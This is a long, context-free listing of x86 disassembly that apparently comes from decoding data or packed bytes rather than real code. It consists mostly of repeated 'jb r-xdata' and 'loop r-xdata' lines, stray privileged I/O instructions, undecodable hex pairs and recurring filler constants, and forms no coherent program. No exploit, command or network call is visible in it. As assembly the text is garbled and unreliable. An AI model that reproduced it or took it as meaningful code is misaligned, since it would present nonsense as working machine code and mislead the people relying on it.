imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
sbb bl [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
arpl [ 0xffffffffe2e2e228 ] sp
jb r-xdata
mov ch 0xb
mov dl 0xa
xchg ebx eax
das
sbb eax 0xee971d1d
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push esp
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
or ebx eax
in eax dx
popad
cli
loop r-xdata
mov ch 0xa
stc
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shr [ ebx ] 0x1
imul edi [ edi + 0x31346916 ] 0x16a71d18
and cl [ ebx ]
test [ ebx - 0x59 ] ch
push cs
mov cl 0x3e
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0xc166ed72
sbb eax 0xb1727272
or edx [ esp + eax + 0x1d ]
jb r-xdata
sbb eax 0x9f6b841d
jb r-xdata
and cl [ ebx ]
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
sbb eax 0x3ce40a1d
jb r-xdata
jb r-xdata
sub dl ah
jb r-xdata
jb r-xdata
jb r-xdata
or ebp ebp
loop r-xdata
push cs
mov bl 0x61
xchg [ esi ] ebx
and cl [ ebx ]
and [ edx ] ecx
sbb eax 0x9a0bb71d
enter 0xe2c4 0xe2
pop ss
sbb eax 0x32be0b1d
sbb eax 0xd122d11d
imul esp [ edi + 0x72212b1e ] 0x72727272
jb r-xdata
add ch [ edi - 0x51 ]
push 0xffffffa7
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx ] 0x976b84
jb r-xdata
jb r-xdata
jb r-xdata
popad
and ebp edx
push 0xffffffb6
jmp [ esi ]
push ss
or esp edx
shl edx 0xe2
jb r-xdata
sbb [ 0x236116a7 ] bl
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov [ esi + 0xea76b84 ] dl
jb r-xdata
sbb eax 0x1bc0b1d
fidiv [ ebp + 0x33870ab2 ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
add al 0x1d
jb r-xdata
sbb eax 0x3c9f6b84
jb r-xdata
jb r-xdata
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
or ah ah
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
add ecx [ edi ]
sbb eax 0x6b72721d
cmpsd [ esi ] [ edi ]
push cs
shl [ edx ] 0x1
imul esp [ edi + 0x691dd116 ] 0xffffff96
pop edi
push es
and cl [ bp + di ]
jb r-xdata
mov esp 0xb50b3c69
in al 0xe2
loop r-xdata
0x6b841269 0x97
jb r-xdata
imul esp [ edi + 0x1eaf691e ] 0x69
sahf
outsd
or cl [ ebx ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov [ 0x6b12971d ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov [ ebx + 0x1d1da40b ] al
sbb eax 0x72727272
jb r-xdata
sbb eax 0x23617272
jb r-xdata
test [ ebx - 0x69 ] ch
jb r-xdata
mov edx 0x12699a88
jb r-xdata
jb r-xdata
xor al 0x1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
lahf
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x564f4c4 ] 0xffffffe2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
adc al [ ebx + ebp * 2 + 0x69bc0097 ]
jb r-xdata
push ds
jb r-xdata
push es
scasd [ edi ]
scasd [ edi ]
and eax 0xb4a906a7
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
and eax 0xb4a906a7
jb r-xdata
in al dx
and eax 0x87902aa7
mov ah 0xaf
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ ecx + ebp * 2 - 0x1b4af4c4 ] bh
xchg edi eax
jb r-xdata
mov dl 0xed
jb r-xdata
jb r-xdata
xchg [ ebx ] esi
jb r-xdata
or ebx [ ebx + 0x72e2e2fa ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl bl
stc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
jb r-xdata
add bh [ edx + 0x12699a88 ]
jb r-xdata
jb r-xdata
test eax 0xba9afb4
inc ebp
jmp edx
jb r-xdata
and eax 0x83952ea7
and eax 0xafb426a7
mov ch 0xe4
imul edx [ edi + 0x3c69bc00 ] 0xb
jb r-xdata
scasd [ edi ]
push ds
imul ebx [ esi + 0x4f0b0a6f ] 0x721d1d34
mov eax 0xe2c1e20b
loop r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0x1d3ce40a
cmpsd [ esi ] [ edi ]
jb r-xdata
xor ch al
loop r-xdata
jb r-xdata
jb r-xdata
mul dl
loop r-xdata
jb r-xdata
and esi esi
imul ebp [ edi + 0x18af0b1e ] 0x1d
sbb eax 0x72727272
in eax dx
jb r-xdata
imul esp [ edi + 0xb2c694c ] 0xffffff8b
hlt
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ecx + esi ] 0x16a71d18
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
mov cl 0x1d
mov ch 0xb2
and cl [ bp + di ]
loopne r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c4950b
fwait
jb r-xdata
mov ah 0xaa
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
jb r-xdata
mov [ edx + 0x6b841269 ] bl
jb r-xdata
jb r-xdata
mov [ 0x1d00bf0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec edi
test eax 0xe2ff450b
loop r-xdata
mov ah 0xaf
jb r-xdata
xchg ebp eax
and [ 0xffffffff87902aa7 ] 0xffffffb4
scasd [ edi ]
cmpsd [ esi ] [ edi ]
mov ah 0xaf
in eax dx
jb r-xdata
or eax [ esi - 0x39 ]
loop r-xdata
jb r-xdata
in eax dx
imul esi [ ebx ] 0x38b76b84
jb r-xdata
fdivr [ edx + 0x1d398d0b ]
popad
and ah al
in eax dx
push ebp
shl [ ecx + 0x23 ] cl
loopne r-xdata
sbb [ 0x55edb51d ] ebx
not [ ebx + 0x1d393a0b ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x1a69b5b3
or ebp [ ecx + 0x6be2e2f1 ]
xor [ ebx - 0x59 ] ch
imul esp [ edi - 0x7bda96c4 ] 0x6b
cmpsd [ esi ] [ edi ]
or cl ah
cmc
loop r-xdata
popad
jb r-xdata
cmp al 0xb
in eax dx
0x26ffb66a 0x1b61
xor [ eax ] ebx
sbb eax 0x236116a7
jb r-xdata
jb r-xdata
or edi [ ecx + eax - 0x128de2e3 ]
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x631a0661
push cs
push ds
loop r-xdata
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
retn 0x60ed
push ebp
in eax 0xb
in eax dx
cmpsd [ esi ] [ edi ]
push ds
sbb eax 0x362b0b1d
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
adc dh [ ecx + 0x2f930ab2 ]
imul edi [ ebx + ecx ] 0xe2e2e4b5
jb r-xdata
or edi [ edi + 0x721d1d00 ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loope r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
push cs
imul esp [ edi + 0x12a76b16 ] 0x1d1dd90b
sbb eax 0x72727272
cmpsd [ esi ] [ edi ]
or ch [ ecx - 0x59 ]
sbb ch [ ebx - 0x59 ]
adc al 0xed
cmp [ bp + si ] cl
sbb eax 0xbc22d11d
or esi esp
jb r-xdata
jb r-xdata
sbb eax 0xf655edb5
xchg ebx eax
or edi [ edx ]
cmp [ 0x7272721d ] ebx
imul ebx [ ebx - 0x1239396a ] 0x1d318467
sbb eax 0xe2f5cc0a
loop r-xdata
loop r-xdata
fidiv [ ebx - 0x9d99ee3 ]
mov dl [ esi ]
jecxz r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
or eax [ ebx + 0x721d1d31 ]
jb r-xdata
imul [ ebx - 0x51 ]
push ds
or ebp [ edi + 0x721d1d18 ]
jb r-xdata
mov bh 0x69
push cs
mov bl 0xb5
imul ebx [ edx ] 0xe2f1a90b
loop r-xdata
sbb [ 0xffffffff8a72721d ] ebx
loop r-xdata
sbb [ 0x550bb21d ] ebx
loop r-xdata
xchg esi eax
jb r-xdata
add [ 0x66ed721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
sbb eax 0x30d122d1
jb r-xdata
and [ bx + di ] ebx
sbb eax 0x550bb21d
jb r-xdata
adc [ eax - 0x1312f479 ] 0xffffffe2
xchg ebp eax
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
or edi edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x300bd388
mov bh 0x38
jb r-xdata
loop r-xdata
jb r-xdata
sbb cl dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ ecx ] 0x1d
sbb eax 0x72727272
sbb eax 0x72727272
sbb eax 0x961deab5
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0x721d1d33
jb r-xdata
jb r-xdata
sbb [ 0x7272721d ] bl
mov bh 0x16
imul esp [ edi + 0xaa76b1e ] 0x6b1aa769
mov cl 0xb
aam 0x37
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x7b7745f4 ] 0xffffff84
imul esp [ edi - 0x747745ee ] 0xb
pop edi
xor ebx [ 0x7272721d ]
jb r-xdata
push 0x1269b4f3
jb r-xdata
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
and dl cl
jb r-xdata
sub esp [ ecx ]
jb r-xdata
outsd
nop
xchg [ ebx ] ecx
jb r-xdata
scasd [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi - 0x77dd2ee8 ] 0xffffff9a
cli
jb r-xdata
jb r-xdata
outsd
mov dl 0xed
loop r-xdata
loop r-xdata
jb r-xdata
and cl [ eax - 0x4a2f466 ]
jb r-xdata
jb r-xdata
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x7747c749 ]
ror [ ebx ] cl
jb r-xdata
jb r-xdata
sbb ch [ esi ]
adc cl [ ebx ]
fstp [ 0x72721d1d ]
jb r-xdata
mov bl [ edx ]
and eax 0x2a76b84
mov ch 0xea
sbb eax 0x1deac696
mov ch 0xce
or ebp [ esi ]
sub ebx [ 0x7272721d ]
jb r-xdata
mov dl ah
jb r-xdata
jb r-xdata
lodsb [ esi ]
inc si
mov ah 0xd9
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1aa7690a ] 0x6b
test [ ecx - 0x24 ] ah
loop r-xdata
adc ch [ edx - 0x59 ]
push 0xffffffa7
jb r-xdata
or eax [ esi + 0x72e2e2ce ]
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
jb r-xdata
jb r-xdata
call 0x69fa5fd8
sbb cl [ edx ]
jb r-xdata
cmp [ 0xffffffffec66ed1d ] bl
mov al [ 0x1a69b4a0 ]
or ch [ ecx + 0x1 ]
sbb eax 0xf226611d
imul edi [ edx ] 0x3d0b1d67
and eax 0xa9af0ea7
mov ah 0xaf
and eax 0x8baf36a7
adc [ eax - 0x1d05f4f5 ] 0x727272e2
jb r-xdata
sbb eax 0xe2ec66ed
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
mov bh 0x1e
jb r-xdata
0xe2fb5d0b 0x72e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor cl ah
loop r-xdata
imul esi [ edi - 0x2c7747c8 ] 0xb
jb r-xdata
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
adc al 0x1d
jb r-xdata
imul ebp [ edi - 0x58947bbc ] 0x4c
jb r-xdata
imul esp [ esi + edi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb ebp ebp
jb r-xdata
imul ebx [ edi ] 0x1d
jb r-xdata
into
jb r-xdata
loop r-xdata
xchg dh cl
jb r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
push cs
scasd [ edi ]
test eax 0xa725afb4
scasd [ edi ]
mov eax [ ecx - 0x5f4f470 ]
in al dx
jb r-xdata
mov [ edx - 0x1d04a2f5 ] bl
loop r-xdata
jb r-xdata
mov eax ebp
pop ebp
in al dx
jb r-xdata
jb r-xdata
sbb eax 0xec66ed1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
outsd
jb r-xdata
pushad
fistp [ ebx + 0x56a76a1d ]
jb r-xdata
jb r-xdata
sar [ ecx ] 0x1
jb r-xdata
jb r-xdata
cmp [ eax + 0x300bd388 ] bh
jb r-xdata
push ebp
loop r-xdata
jb r-xdata
imul esp [ esi - 0x7745213a ] 0xffffff87
imul ebp [ ebx + ecx ] 0xe2e2f48b
jb r-xdata
inc esp
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x6f9e691e ] 0x344f0b0a
sbb eax 0xed22671d
popfd
call 0xffffffffbde8a1e3
mov ecx 0x7272212b
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp - 0x5 ]
sub al 0x1d
sbb eax 0xbeabfdb
loop r-xdata
mov cl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx ] 0x18a76b84
mov ebx 0x16af6b84
jb r-xdata
outsb
jb r-xdata
pop ds
jb r-xdata
or eax [ ebx ]
jb r-xdata
adc ch [ ecx + 0x2a ]
mov ah cl
test [ ebx - 0x51 ] ch
adc [ ebx + 0x16af6b84 ] bh
add ebx [ 0xffffffff8872721d ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec esp
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
or [ ebx + 0x6972721d ] edi
xor al 0xd1
and cl [ eax - 0x48947b6a ]
inc eax
mov eax 0x44af6b84
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edi + 0x721d1d33 ]
imul ebp [ edi - 0x7bd596ea ] 0x6b
jb r-xdata
sbb eax 0x2f590a1d
jb r-xdata
sbb eax 0x1d2f590a
sbb eax 0xd880bbb
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
test [ ebx - 0x5a ] ch
or bl [ 0xffffffffbb1d1d06 ]
outsd
and ch ch
cmp [ ecx + ebx * 8 + 0x4666ed19 ] esi
jb r-xdata
jb r-xdata
imul esp [ edi - 0x12dd98e2 ] 0x66
int3
popad
fsubr st2
or ebp [ ebx + 0x1f ]
test [ ecx - 0x67 ] ah
movsb [ edi ] [ esi ]
loop r-xdata
push ebp
mov eax [ 0xffffffffc80bb286 ]
aas
sbb eax 0xf2e25a1d
loop r-xdata
mov dl 0xed
add bl [ 0xffffffff9f61721d ]
sbb eax 0x30b1eb7
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
loope r-xdata
add eax [ edx ]
sbb eax 0x9f61721d
and ch ch
cbw
xor ebx [ 0x1de2881d ]
je r-xdata
mov ah 0xa
sbb eax 0xbb1d1d06
push ss
jb r-xdata
sbb eax 0x880bbb1d
or eax 0x72721d1d
jb r-xdata
or bl [ ecx + 0x2f ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
pop ecx
das
in eax dx
shl dl cl
loop r-xdata
loop r-xdata
fstp [ ecx ]
jb r-xdata
jmp r-xdata
push ds
jb r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
mov bh 0xb
mov [ 0xffffffffb7e2e2fb ] al
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x6f
out 0xb al
sub [ 0xffffffff87881d1d ] esp
test [ ebx - 0x59 ] ch
add al 0xba
mov [ ecx + ebp * 2 - 0x50947bd6 ] cl
or bh [ ebx + 0x6b848588 ]
scasd [ edi ]
or [ ebx + 0x6b848b88 ] bh
scasd [ edi ]
push cs
mov ebx 0x6b848c88
scasd [ edi ]
or al 0xbb
test [ ebx - 0x51 ] ch
or eax [ ebp + 0x3 ]
mov bh 0xb
jb r-xdata
sub al [ ebx + ebp * 2 + 0x22d118a7 ]
push 0xffffffa7
push es
or esp [ ecx + 0x38 ]
sbb eax 0x7272721d
jb r-xdata
push esi
scasd [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov cl 0xb
pop esp
fsubr st2
loop r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
xchg edi eax
out dx al
or cl [ edx ]
sub bl [ 0xffffffffee26611d ]
and cl [ bp + di ]
inc esi
or [ 0x7272721d ] bl
push ds
mov dl 0x1d
or ecx [ edi - 0x7 ]
loop r-xdata
fldcw [ 0xffffffffe2e467ed ]
cmp ax 0xe2c2
in eax dx
inc ebp
jb r-xdata
jb r-xdata
mov ebx 0x6b849a88
scasd [ edi ]
xor al 0xbb
mov [ ebx + 0x3aaf6b84 ] al
mov ebx 0x6b848588
scasd [ edi ]
sbb eax 0xf66aeeaf
jecxz r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
imul ecx [ esi ] 0x88fe0e61
xchg [ edx + 0x1d063f0b ] bh
sbb eax 0x72727272
jb r-xdata
or esp [ edx - 0x481d1d05 ]
mov ah 0xa
jpe r-xdata
sbb eax 0x8872721d
inc ecx
or eax 0xa76f1d1d
push edx
mov dl 0xb4
outsd
outsd
outsb
pop ds
sbb eax 0x2f370a1d
sbb eax 0x67bbbb1d
and ch ch
imul ecx [ di ] 0x1d
sbb eax 0xb276a76f
and ch ch
loop r-xdata
jb r-xdata
test eax 0xa969b3aa
mov edx 0x1d12e90a
sbb eax 0x19590bbb
vpsrad ymm4 ymm5 xmm2
in eax dx
jmp r-xdata
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
imul eax [ ecx ] 0x26611d1d
sbb eax 0xa0e8898a
mov al [ 0xa1a69b4 ]
sbb eax 0xe8898a1d
int 0xe1
loop r-xdata
mov al [ edi + 0x5b ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x590bbb1d
sbb [ 0x7272721d ] ebx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
shl dl cl
loop r-xdata
mov cl [ edi ]
shl ah 0x1
or al 0xb1
imul esp [ edx + ebx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
test [ ebx ] 0xa31b
pop ebx
jb r-xdata
test [ ebx - 0x61 ] ch
mov [ 0xffffffffaf5b212b ] al
mov eax 0xb4b1e2e2
test bl bl
0x1d1f610b 0x721d
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
in al 0xc
mov cl 0x6b
sbb ah dl
loop r-xdata
xchg esp eax
mov dl 0xb
xchg ebx eax
loop r-xdata
cld
mov [ edi + 0x2ca76b84 ] dl
jb r-xdata
test [ ebx ] 0xe2e2a31b
jb r-xdata
jb r-xdata
push ss
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
and cl [ ebx ]
jmp 0x73288283
loope r-xdata
or bh ah
or cl ch
loope r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xc4950b1d
loop r-xdata
mov dl ah
xor [ edx - 0x77443378 ] bh
test [ ebx - 0x59 ] ch
jb r-xdata
